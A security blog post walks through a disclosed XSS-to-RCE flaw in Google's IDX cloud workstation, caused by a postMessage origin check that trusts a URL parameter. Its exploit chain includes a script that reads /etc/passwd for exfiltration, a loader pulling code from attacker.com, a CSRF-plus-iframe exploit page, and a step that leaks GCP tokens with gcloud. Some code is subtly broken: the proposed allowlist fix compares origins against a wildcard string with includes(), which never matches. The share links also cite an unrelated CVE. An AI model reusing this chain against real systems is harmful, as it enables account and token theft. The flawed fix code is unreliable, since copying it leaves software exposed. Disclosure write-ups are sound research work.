---
title: "XSS to RCE in Google IDX Workstation: A Technical Deep Dive"
layout: post
tags: [Google, ProjectIDX, FirebaseStudio, XSS, RCE, security, pentesting, red-team, web-security, JavaScript, exploit, hacking, cybersecurity, GCP, bugbounty, XSS to RCE in Google IDX Workstation: A Technical Deep Dive]
image: /assets/images/xssrce.png
category: security
---


# XSS to RCE in Google IDX Workstation: A Technical Deep Dive

Hey there, I'm someone who loves digging into security vulnerabilities like this. Cloud-based development environments like Google's Project IDX (now integrated into Firebase Studio) make life easier for developers, but they also come with some intriguing security risks. Discovered in September 2025, this XSS vulnerability escalates to Remote Code Execution (RCE), potentially leaking Google Cloud Platform (GCP) tokens. Found by Aditya Sunny from NullSecurityX, it earned a $22,500 bounty from Google's Vulnerability Reward Program. Let's dive into the technical details together, examining code snippets and how the exploit works. I'll keep it natural, like we're chatting over coffee, but with solid technical depth.

## The Basics of IDX Workstation

First off, a quick rundown on what IDX Workstation is. It's a browser-based cloud IDE built on the open-source version of Visual Studio Code (Code OSS). It runs on subdomains like `*.cloudworkstations.dev` or `*.cloudworkstations.googleusercontent.com`. Features include code editing, terminal access, extensions from the Open VSX Registry, web previews, and even Android emulators. From a security standpoint, iframe and web worker communications are key, relying on things like the postMessage API. If origin validation is weak, things can go south quickly.

## The Root Cause: Weakness in the postMessage Handler

The heart of the vulnerability is in the `webWorkerExtensionHostIframe.html` file. This iframe manages web worker extension hosts and loads on the same origin as the main UI, making same-origin policy (SOP) breaches possible if not secured properly.

Here's the vulnerable code snippet:

```javascript
const parentOrigin = searchParams.get('parentOrigin') || window.origin;
self.onmessage = (event) => {
  if (event.origin !== parentOrigin) return;
  worker.postMessage(event.data, event.ports);
}
```

Let's break this down line by line, as this is where it all starts.

- **const parentOrigin = searchParams.get('parentOrigin') || window.origin;**  
  This is the problematic part. The `parentOrigin` value comes from URL query parameters (e.g., `?parentOrigin=malicious.com`). If missing, it defaults to `window.origin`. Why is this bad? It's user-controllable – an attacker can manipulate the URL to insert their own domain, bypassing restrictions. In a secure design, origins should be hardcoded or whitelisted, not pulled from untrusted sources like query params. This goes against the principle of least privilege.

- **self.onmessage = (event) => {**  
  A simple message listener, catching events from the parent window.

- **if (event.origin !== parentOrigin) return;**  
  It checks if the message's origin matches `parentOrigin`. If not, it drops the message. But since `parentOrigin` is manipulable, this check is useless. An attacker can set it to their exploit domain and slip messages through. A better approach would use a fixed whitelist: `if (event.origin !== 'https://trusted.google.domain')`. It also misses edge cases like sandboxed iframes or null origins.

- **worker.postMessage(event.data, event.ports);**  
  Forwards the message to the worker. This is key because binary data (like ArrayBuffers) gets hex-encoded and passed along. This allows XSS payloads to inject into the worker context. Once injected, the code runs with the workstation's privileges – file system access, terminal commands, you name it.

This flaw reminds me of similar issues in GitLab's Web IDE, where poor iframe isolation turns XSS into RCE.

## The Exploit Chain: Step by Step

To exploit this, you need the victim's subdomain – often leaked via Referer headers or DNS queries. The chain combines XSS, CSRF, and postMessage manipulation. Let's walk through it with code examples.

1. **Subdomain Discovery:**  
   The victim shares a preview link: `9000-[victim-subdomain].cloudworkstations.dev`. The attacker strips the `9000-` prefix to get the base subdomain.

2. **Attacker Setup:**  
   The attacker creates their own workstation and notes the subdomain.

3. **Payload Preparation:**  
   - **script1.js:** The main RCE payload. Example:  
     ```javascript
     const fs = require('fs'); // Assuming Node-like access in the worker
     fs.readFile('/etc/passwd', (err, data) => {
       if (err) throw err;
       console.log(data.toString()); // Exfiltrate to the attacker
     });
     ```  
   - **script2.js:** References script1.js.  
     ```javascript
     const script = document.createElement('script');
     script.src = 'https://attacker.com/script1.js'; // Victim domain variant
     document.body.appendChild(script);
     ```  
   - **xss.ipynb:** A Jupyter notebook referencing script2.js (exploits notebook rendering for injection).

4. **Uploading and Hosting:**  
   Upload xss.ipynb to the attacker's workstation. Host exploit.html (e.g., via ngrok):  
   ```html
   <!DOCTYPE html>
   <html>
   <body>
   <script>
     const victimDomain = '[victim-subdomain].cloudworkstations.dev';
     const attackerDomain = '[attacker-subdomain].cloudworkstations.googleusercontent.com';
     // CSRF to log into attacker's workstation
     fetch(`${attackerDomain}/login`, { method: 'POST', credentials: 'include' });
     // Iframe and postMessage injection
     const iframe = document.createElement('iframe');
     iframe.src = `${victimDomain}/?parentOrigin=${window.origin}`;
     document.body.appendChild(iframe);
     iframe.onload = () => {
       iframe.contentWindow.postMessage({ malicious: 'payload' }, '*');
     };
   </script>
   </body>
   </html>
   ```

5. **Victim Interaction:**  
   The victim clicks the exploit.html link. It triggers CSRF login, loads the iframe, and injects the payload via postMessage.

6. **Achieving RCE:**  
   The injected JS accesses the file system – for example, running `gcloud auth print-access-token` to leak tokens. Data gets exfiltrated to the attacker's server.

This chain shows how a client-side flaw can lead to server-side dominance in cloud IDEs.

## Impacts and Risks

- **RCE:** Full control over the victim's cloud instance – running commands, manipulating files.  
- **Token Leakage:** GCP tokens (with cloud-platform scope) grant access to services like Compute Engine and Storage.  
- **Lateral Movement:** In team settings, compromising one workstation could spread to others.

## Patch and Mitigations

Google patched it by moving the iframe to a separate origin, strengthening cross-origin barriers. At the code level, fixes could look like this:  

```javascript
const ALLOWED_ORIGINS = ['https://*.cloudworkstations.googleusercontent.com'];
if (!ALLOWED_ORIGINS.includes(event.origin)) return;
```

Also, add `sandbox="allow-scripts"` to iframes, apply CSP: `script-src 'self'; frame-ancestors 'none';`. Broader tips: Encrypt DNS, use Referrer-Policy: no-referrer, and monitor subdomains.

## Final Thoughts

Vulnerabilities like this highlight the double-edged sword of web-based IDEs – convenience meets risk when client-side security ties directly to cloud resources. Always prioritize origin validation in APIs like postMessage. Programs like Google's VRP keep researchers motivated to find these. If you're tinkering with similar stuff, stay vigilant – a small parameter can lead to big trouble. Thanks for reading; if you have questions or thoughts, drop them in the comments below!

## Video Demonstration

For a visual walkthrough of the exploit, check out this demo video from the original disclosure:

<video controls>
  <source src="[https://video.twimg.com/amplify_video/1965327561757028224/vid/avc1/488x270/eoeXcdjdjq3ergXA.mp4?tag=16](https://x.com/i/status/1965327615277027446)" type="video/mp4">
  Your browser does not support the video tag.
</video>



<!-- Share Buttons Start -->
<div class="share-buttons">
  <p>Share this post:</p>
  <a class="share-btn twitter" href="https://twitter.com/intent/tweet?text=CVE-2025-8085: Unauthenticated SSRF in Ditty WordPress Plugin&url={{ page.url | absolute_url }}" target="_blank">Twitter</a>
  <a class="share-btn facebook" href="https://www.facebook.com/sharer/sharer.php?u={{ page.url | absolute_url }}" target="_blank">Facebook</a>
  <a class="share-btn reddit" href="https://www.reddit.com/submit?url={{ page.url | absolute_url }}&title=CVE-2025-8085: Unauthenticated SSRF in Ditty WordPress Plugin" target="_blank">Reddit</a>
</div>

<style>
.share-buttons {
  margin-top: 30px;
  font-family: sans-serif;
}
.share-buttons p {
  margin-bottom: 8px;
  font-weight: bold;
}
.share-buttons .share-btn {
  display: inline-block;
  margin-right: 8px;
  padding: 8px 14px;
  color: #fff;
  text-decoration: none;
  border-radius: 5px;
  font-size: 14px;
  transition: opacity 0.2s;
}
.share-buttons .share-btn:hover {
  opacity: 0.8;
}
.share-buttons .twitter { background: #1da1f2; }
.share-buttons .facebook { background: #4267B2; }
.share-buttons .reddit { background: #ff4500; }
</style>
<!-- Share Buttons End -->
